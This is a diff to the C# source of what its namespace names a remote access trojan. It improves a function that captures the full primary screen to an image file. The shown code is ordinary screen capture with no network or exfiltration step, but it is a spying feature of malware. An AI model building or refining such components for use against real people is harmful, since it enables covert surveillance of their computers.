@@ -17,13 +17,17 @@ namespace remote_access_trojan
         {
             // Create Bitmap image to store screenshot in
             Bitmap image;
-            image = new Bitmap(1000, 900);
-            Rectangle bounds = Screen.GetBounds(Point.Empty);
-            Size s = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            
+            // Bitmap is the size of the entire screen + task bar (Make sure your DPI is at 100%) 
+            image = new Bitmap(Screen.PrimaryScreen.Bounds.Width,Screen.PrimaryScreen.Bounds.Height);
 
-            Graphics memoryGraphics = Graphics.FromImage(image);
-            // Copy screen
-            memoryGraphics.CopyFromScreen(0, 0, 0, 0, bounds.Size);
+
+            using (Graphics g = Graphics.FromImage(image))
+            {
+                // Copy the bytes from the screen 
+                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
+                
+            }
 
             // Save screenshot into file on Computer 
             string str = "";
@@ -43,3 +47,4 @@ namespace remote_access_trojan
         }
     }
 }
+ 
